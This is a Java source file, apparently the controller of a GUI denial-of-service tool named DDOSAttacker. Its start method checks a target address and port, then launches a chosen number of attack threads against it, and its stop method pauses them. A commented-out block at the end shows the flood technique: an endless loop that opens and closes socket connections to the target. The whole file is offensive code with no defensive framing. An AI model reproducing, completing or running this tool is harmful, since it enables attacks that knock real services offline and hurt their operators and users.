package dosattackergui;
import java.io.*;  
import java.net.*;
import java.util.Scanner;
import javax.swing.JLabel;
import javax.swing.JOptionPane;

public class DDOSAttacker {
    static AttackThread[] threads;
public static void stop(StatusThread statusThread,JLabel label)
{
    label.setText("Not Started / Paused");
    try{
        statusThread.stop();
    }
    catch(Exception e)
    {
        e.printStackTrace();
    }
    if(threads.length == 0)
    {
        JOptionPane.showMessageDialog(null, "To pause the attack,  at first start the attacking");
        return;
    }
    else
    {
        try{
            for(int i=0;i<threads.length;i++)
            {
                threads[i].stop();
            }
        }
        catch(Exception e)
        {
            JOptionPane.showMessageDialog(null,e.getMessage());
            return;
        }
        JOptionPane.showMessageDialog(null,"Attack Paused");
        return;
    }
}
public static void start(String addr,int port,int noOfThreads) {
    Socket s=null;
    try{ 
        
        try{    
          s=  new Socket(addr,port);
        }
        catch(NumberFormatException e)
        {
            JOptionPane.showMessageDialog(null, "Invalid Port");
            return;
        }
        catch(ConnectException e)
        {
            JOptionPane.showMessageDialog(null, "Connection Refused by Server or already in attack");
            return;
        }
        catch(UnknownHostException e)
        {
            JOptionPane.showMessageDialog(null, "Invalid Address");
            return;
        }
        catch(Exception e)
        {
            JOptionPane.showMessageDialog(null, e.getMessage());
            return;
        }
        
	int NUM_OF_THREADS = noOfThreads!=0 ? noOfThreads : 5 ;
        
        threads=new AttackThread[NUM_OF_THREADS];
	if(s!=null)
	{	
		System.out.println("Socket connection created successfully\nAttacking...");
		s.close();
	}
	
	try{
		for(int i=0;i<NUM_OF_THREADS;i++)
		{
			threads[i]=new AttackThread(addr,port);
                        threads[i].start();
			
		}
	}
	catch(Exception e){System.out.println(e);} 	 
 
        }catch(Exception e){System.out.println(e);}  
    }  
}
/*new Thread()
			{
				public void run()
				{									
									
					for(;;)//(int i=0;i<100000;i++)
					{	
						try{
							s = new Socket(args[0],Integer.parseInt(args[1]));
							s.close();
						}	
						catch(Exception e){}	
					}
				}
			}.start();*/